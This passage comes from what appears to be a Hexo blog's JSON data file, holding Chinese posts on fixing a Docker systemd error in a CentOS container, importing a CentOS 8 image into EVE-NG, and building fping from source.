/bin/bash\n```","slug":"docker-apache","published":1,"updated":"2024-05-03T03:55:54.845Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5fa00517zj3e0vzf8su","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"问题描述\"><a href=\"#问题描述\" class=\"headerlink\" title=\"问题描述\"></a>问题描述</h3><p>docker报错：<br>System has not been booted with systemd as init system (PID 1). Can‘t operate.<br>Failed to connect to bus: Host is down</p>\n<span id=\"more\"></span>\n\n<h3 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 运行centos</span></span><br><span class=\"line\"><span class=\"comment\"># docker run -itd --name centos centos /bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 替换为：</span></span><br><span class=\"line\"><span class=\"comment\"># 获取systemctl权限</span></span><br><span class=\"line\">docker run --privileged -itd --name centos centos /usr/sbin/init</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 进入终端</span></span><br><span class=\"line\">docker <span class=\"built_in\">exec</span> -it centos /bin/bash</span><br></pre></td></tr></table></figure>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"问题描述\"><a href=\"#问题描述\" class=\"headerlink\" title=\"问题描述\"></a>问题描述</h3><p>docker报错：<br>System has not been booted with systemd as init system (PID 1). Can‘t operate.<br>Failed to connect to bus: Host is down</p>","more":"<h3 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 运行centos</span></span><br><span class=\"line\"><span class=\"comment\"># docker run -itd --name centos centos /bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 替换为：</span></span><br><span class=\"line\"><span class=\"comment\"># 获取systemctl权限</span></span><br><span class=\"line\">docker run --privileged -itd --name centos centos /usr/sbin/init</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 进入终端</span></span><br><span class=\"line\">docker <span class=\"built_in\">exec</span> -it centos /bin/bash</span><br></pre></td></tr></table></figure>"},{"title":"EVE导入CENTOS8的镜像","date":"2023-05-31T08:05:58.000Z","_content":"\n\n\n最近做python的三级项目，需要在EVE里面使用服务器的节点，因为EVE是不自带相关镜像的，只能通过自己导入的方式，全网的教程层出不穷，在借鉴学习了几篇文章后，简明精要的做出一下总结。\n\n### 前期准备\n\n首先需要EVE的导入镜像，我只用到了CENTOS8的，[相关链接](https://pan.baidu.com/s/14OK6FP1sUPU5KDQHexRLbA) 放在了云盘里，提取码：0731，需要自取。虚拟机的`user`用户和`root`密码均为`Test123`。\n\n<!-- more -->\n\n### 操作步骤\n\n1. 使用文件传输工具将镜像导入到eve的虚拟机里面，上传路径为`/opt/unetlab/addons/qemu/`\n\n2. 接着使用命令解压这个文件\n\n```bash\ntar -xf linux-centos-8.tgz\n```\n\n3. 执行命令修正权限。\n\n```bash\n/opt/unetlab/wrappers/unl_wrapper -a fixpermissions\n```\n\n>修正权限我也不知道不进行这步会报什么错，我没进行这步也能正常使用，总之，如果没有进行这步，然后遇到什么问题，不妨回来补一下这个操作。\n\n4. 最后大功告成，在EVE网页中可以使用了(鼠标右击-->node-->linux-->image)。\n\n![导入成功](./eve-import-img/1.png)\n\n---\n\n### 补充\n\n应***汪某人***的需求（作为一名出色的博主，应该做到尽善尽美），再补充一点内容。\n\n* 首先是EVE连接时有一个很坑的点，虚拟机打开时提示默认用户名是`root`，密码是`eve`。但其实密码是不对的，密码是`cisco`。不清楚是不是因为版本的问题。总之，如果`eve`不好使，就换成`cisco`试试。\n\n* 连接工具大多数人使用的都是Xshell和XFTP，这两个工具确实非常不错，但是后来本人在逛github时，发现一个非常好用的工具，这个工具是免费开源的，并且集合了Xshell远程命令的功能和XFTP的文件传输功能，还有额外的CMD窗口。支持windows视窗化查看虚拟机的文件。截图如下，[链接在这](https://github.com/kingToolbox/WindTerm/releases/download/2.5.0/WindTerm_2.5.0_Windows_Portable_x86_64.zip) 。\n\n![windterm](./eve-import-img/2.png)\n\n","source":"_posts/eve-import-img.md","raw":"---\ntitle: EVE导入CENTOS8的镜像\ndate: 2023-05-31 16:05:58\ncategories: 学习过程\ntags:\n  - EVE\n---\n\n\n\n最近做python的三级项目，需要在EVE里面使用服务器的节点，因为EVE是不自带相关镜像的，只能通过自己导入的方式，全网的教程层出不穷，在借鉴学习了几篇文章后，简明精要的做出一下总结。\n\n### 前期准备\n\n首先需要EVE的导入镜像，我只用到了CENTOS8的，[相关链接](https://pan.baidu.com/s/14OK6FP1sUPU5KDQHexRLbA) 放在了云盘里，提取码：0731，需要自取。虚拟机的`user`用户和`root`密码均为`Test123`。\n\n<!-- more -->\n\n### 操作步骤\n\n1. 使用文件传输工具将镜像导入到eve的虚拟机里面，上传路径为`/opt/unetlab/addons/qemu/`\n\n2. 接着使用命令解压这个文件\n\n```bash\ntar -xf linux-centos-8.tgz\n```\n\n3. 执行命令修正权限。\n\n```bash\n/opt/unetlab/wrappers/unl_wrapper -a fixpermissions\n```\n\n>修正权限我也不知道不进行这步会报什么错，我没进行这步也能正常使用，总之，如果没有进行这步，然后遇到什么问题，不妨回来补一下这个操作。\n\n4. 最后大功告成，在EVE网页中可以使用了(鼠标右击-->node-->linux-->image)。\n\n![导入成功](./eve-import-img/1.png)\n\n---\n\n### 补充\n\n应***汪某人***的需求（作为一名出色的博主，应该做到尽善尽美），再补充一点内容。\n\n* 首先是EVE连接时有一个很坑的点，虚拟机打开时提示默认用户名是`root`，密码是`eve`。但其实密码是不对的，密码是`cisco`。不清楚是不是因为版本的问题。总之，如果`eve`不好使，就换成`cisco`试试。\n\n* 连接工具大多数人使用的都是Xshell和XFTP，这两个工具确实非常不错，但是后来本人在逛github时，发现一个非常好用的工具，这个工具是免费开源的，并且集合了Xshell远程命令的功能和XFTP的文件传输功能，还有额外的CMD窗口。支持windows视窗化查看虚拟机的文件。截图如下，[链接在这](https://github.com/kingToolbox/WindTerm/releases/download/2.5.0/WindTerm_2.5.0_Windows_Portable_x86_64.zip) 。\n\n![windterm](./eve-import-img/2.png)\n\n","slug":"eve-import-img","published":1,"updated":"2024-05-03T03:55:54.845Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5fc00557zj3c5mnbebn","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>最近做python的三级项目，需要在EVE里面使用服务器的节点，因为EVE是不自带相关镜像的，只能通过自己导入的方式，全网的教程层出不穷，在借鉴学习了几篇文章后，简明精要的做出一下总结。</p>\n<h3 id=\"前期准备\"><a href=\"#前期准备\" class=\"headerlink\" title=\"前期准备\"></a>前期准备</h3><p>首先需要EVE的导入镜像，我只用到了CENTOS8的，<a href=\"https://pan.baidu.com/s/14OK6FP1sUPU5KDQHexRLbA\">相关链接</a> 放在了云盘里，提取码：0731，需要自取。虚拟机的<code>user</code>用户和<code>root</code>密码均为<code>Test123</code>。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"操作步骤\"><a href=\"#操作步骤\" class=\"headerlink\" title=\"操作步骤\"></a>操作步骤</h3><ol>\n<li><p>使用文件传输工具将镜像导入到eve的虚拟机里面，上传路径为<code>/opt/unetlab/addons/qemu/</code></p>\n</li>\n<li><p>接着使用命令解压这个文件</p>\n</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tar -xf linux-centos-8.tgz</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>执行命令修正权限。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/opt/unetlab/wrappers/unl_wrapper -a fixpermissions</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>修正权限我也不知道不进行这步会报什么错，我没进行这步也能正常使用，总之，如果没有进行这步，然后遇到什么问题，不妨回来补一下这个操作。</p>\n</blockquote>\n<ol start=\"4\">\n<li>最后大功告成，在EVE网页中可以使用了(鼠标右击–&gt;node–&gt;linux–&gt;image)。</li>\n</ol>\n<p><img src=\"/2023/05/31/eve-import-img/1.png\" alt=\"导入成功\"></p>\n<hr>\n<h3 id=\"补充\"><a href=\"#补充\" class=\"headerlink\" title=\"补充\"></a>补充</h3><p>应<em><strong>汪某人</strong></em>的需求（作为一名出色的博主，应该做到尽善尽美），再补充一点内容。</p>\n<ul>\n<li><p>首先是EVE连接时有一个很坑的点，虚拟机打开时提示默认用户名是<code>root</code>，密码是<code>eve</code>。但其实密码是不对的，密码是<code>cisco</code>。不清楚是不是因为版本的问题。总之，如果<code>eve</code>不好使，就换成<code>cisco</code>试试。</p>\n</li>\n<li><p>连接工具大多数人使用的都是Xshell和XFTP，这两个工具确实非常不错，但是后来本人在逛github时，发现一个非常好用的工具，这个工具是免费开源的，并且集合了Xshell远程命令的功能和XFTP的文件传输功能，还有额外的CMD窗口。支持windows视窗化查看虚拟机的文件。截图如下，<a href=\"https://github.com/kingToolbox/WindTerm/releases/download/2.5.0/WindTerm_2.5.0_Windows_Portable_x86_64.zip\">链接在这</a> 。</p>\n</li>\n</ul>\n<p><img src=\"/2023/05/31/eve-import-img/2.png\" alt=\"windterm\"></p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>最近做python的三级项目，需要在EVE里面使用服务器的节点，因为EVE是不自带相关镜像的，只能通过自己导入的方式，全网的教程层出不穷，在借鉴学习了几篇文章后，简明精要的做出一下总结。</p>\n<h3 id=\"前期准备\"><a href=\"#前期准备\" class=\"headerlink\" title=\"前期准备\"></a>前期准备</h3><p>首先需要EVE的导入镜像，我只用到了CENTOS8的，<a href=\"https://pan.baidu.com/s/14OK6FP1sUPU5KDQHexRLbA\">相关链接</a> 放在了云盘里，提取码：0731，需要自取。虚拟机的<code>user</code>用户和<code>root</code>密码均为<code>Test123</code>。</p>","more":"<h3 id=\"操作步骤\"><a href=\"#操作步骤\" class=\"headerlink\" title=\"操作步骤\"></a>操作步骤</h3><ol>\n<li><p>使用文件传输工具将镜像导入到eve的虚拟机里面，上传路径为<code>/opt/unetlab/addons/qemu/</code></p>\n</li>\n<li><p>接着使用命令解压这个文件</p>\n</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tar -xf linux-centos-8.tgz</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>执行命令修正权限。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/opt/unetlab/wrappers/unl_wrapper -a fixpermissions</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>修正权限我也不知道不进行这步会报什么错，我没进行这步也能正常使用，总之，如果没有进行这步，然后遇到什么问题，不妨回来补一下这个操作。</p>\n</blockquote>\n<ol start=\"4\">\n<li>最后大功告成，在EVE网页中可以使用了(鼠标右击–&gt;node–&gt;linux–&gt;image)。</li>\n</ol>\n<p><img src=\"/2023/05/31/eve-import-img/1.png\" alt=\"导入成功\"></p>\n<hr>\n<h3 id=\"补充\"><a href=\"#补充\" class=\"headerlink\" title=\"补充\"></a>补充</h3><p>应<em><strong>汪某人</strong></em>的需求（作为一名出色的博主，应该做到尽善尽美），再补充一点内容。</p>\n<ul>\n<li><p>首先是EVE连接时有一个很坑的点，虚拟机打开时提示默认用户名是<code>root</code>，密码是<code>eve</code>。但其实密码是不对的，密码是<code>cisco</code>。不清楚是不是因为版本的问题。总之，如果<code>eve</code>不好使，就换成<code>cisco</code>试试。</p>\n</li>\n<li><p>连接工具大多数人使用的都是Xshell和XFTP，这两个工具确实非常不错，但是后来本人在逛github时，发现一个非常好用的工具，这个工具是免费开源的，并且集合了Xshell远程命令的功能和XFTP的文件传输功能，还有额外的CMD窗口。支持windows视窗化查看虚拟机的文件。截图如下，<a href=\"https://github.com/kingToolbox/WindTerm/releases/download/2.5.0/WindTerm_2.5.0_Windows_Portable_x86_64.zip\">链接在这</a> 。</p>\n</li>\n</ul>\n<p><img src=\"/2023/05/31/eve-import-img/2.png\" alt=\"windterm\"></p>"},{"title":"源码安装 fping 命令","date":"2023-10-14T05:12:58.000Z","_content":"\n### 安装步骤\n\n1. 下载源码包\n\n连接网络在线下载\n\n```bash\nwget http://fping.org/dist/fping-3.15.tar.gz\n```\n\n<!-- more -->\n\n或者使用我自己准备好的源码包，目前存放在百度网盘里，[**点击跳转**](https://pan.baidu.com/s/1HF8KQNhvoxPca6ic5m14pg?pwd=ykb6)。\n\n2. 解压源码包\n\n```bash\ntar -xf fping-3.15.tar.gz && cd fping-3.15\n```\n\n3. 执行 configure 脚本检测环境\n\n```bash\n./configure\n```\n\n这一步既可以根据提示信息来按需安装为安装的依赖包，也可以参照我之前的博文[**一键安装源码依赖包**](https://nustarain.gitee.io/2023/10/14/SoucecodeInstallFping/)，进行无脑安装。\n\n4. 最行操作\n\n```bash\nmake && make install\n```\n\n5. 验证安装\n\n```bash\nfping -v\n```","source":"_posts/fping.md","raw":"---\ntitle: 源码安装 fping 命令\ndate: 2023-10-14 13:12:58\ncategories: 小玩意儿\ntags:\n  - Linux\n---\n\n### 安装步骤\n\n1. 下载源码包\n\n连接网络在线下载\n\n```bash\nwget http://fping.org/dist/fping-3.15.tar.gz\n```\n\n<!-- more -->\n\n或者使用我自己准备好的源码包，目前存放在百度网盘里，[**点击跳转**](https://pan.baidu.com/s/1HF8KQNhvoxPca6ic5m14pg?pwd=ykb6)。\n\n2. 解压源码包\n\n```bash\ntar -xf fping-3.15.tar.gz && cd fping-3.15\n```\n\n3. 执行 configure 脚本检测环境\n\n```bash\n./configure\n```\n\n这一步既可以根据提示信息来按需安装为安装的依赖包，也可以参照我之前的博文[**一键安装源码依赖包**](https://nustarain.gitee.io/2023/10/14/SoucecodeInstallFping/)，进行无脑安装。\n\n4. 最行操作\n\n```bash\nmake && make install\n```\n\n5. 验证安装\n\n```bash\nfping -v\n```","slug":"fping","published":1,"updated":"2024-05-03T03:55:54.849Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5fe00587zj3e40i0hv3","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"安装步骤\"><a href=\"#安装步骤\" class=\"headerlink\" title=\"安装步骤\"></a>安装步骤</h3><ol>\n<li>下载源码包</li>\n</ol>\n<p>连接网络在线下载</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://fping.org/dist/fping-3.15.tar.gz</span><br></pre></td></tr></table></figure>\n\n<span id=\"more\"></span>\n\n<p>或者使用我自己准备好的源码包，目前存放在百度网盘里，<a href=\"https://pan.baidu.com/s/1HF8KQNhvoxPca6ic5m14pg?pwd=ykb6\"><strong>点击跳转</strong></a>。</p>\n<ol start=\"2\">\n<li>解压源码包</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tar -xf fping-3.15.tar.gz &amp;&amp; <span class=\"built_in\">cd</span> fping-3.15</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>执行 configure 脚本检测环境</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./configure</span><br></pre></td></tr></table></figure>\n\n<p>这一步既可以根据提示信息来按需安装为安装的依赖包，也可以参照我之前的博文<a href=\"https://nustarain.gitee.io/2023/10/14/SoucecodeInstallFping/\"><strong>一键安装源码依赖包</strong></a>，进行无脑安装。</p>\n<ol start=\"4\">\n<li>最行操作</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>验证安装</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fping -v</span><br></pre></td></tr></table></figure>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"安装步骤\"><a href=\"#安装步骤\" class=\"headerlink\" title=\"安装步骤\"></a>安装步骤</h3><ol>\n<li>下载源码包</li>\n</ol>\n<p>连接网络在线下载</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://fping.org/dist/fping-3.15.tar.gz</span><br></pre></td></tr></table></figure>","more":"<p>或者使用我自己准备好的源码包，目前存放在百度网盘里，<a href=\"https://pan.baidu.com/s/1HF8KQNhvoxPca6ic5m14pg?pwd=ykb6\"><strong>点击跳转</strong></a>。</p>\n<ol start=\"2\">\n<li>解压源码包</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tar -xf fping-3.15.tar.gz &amp;&amp; <span class=\"built_in\">cd</span> fping-3.15</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>执行 configure 脚本检测环境</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./configure</span><br></pre></td></tr></table></figure>\n\n<p>这一步既可以根据提示信息来按需安装为安装的依赖包，也可以参照我之前的博文<a href=\"https://nustarain.gitee.io/2023/10/14/SoucecodeInstallFping/\"><strong>一键安装源码依赖包</strong></a>，进行无脑安装。</p>\n<ol start=\"4\">\n<li>最行操作</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td 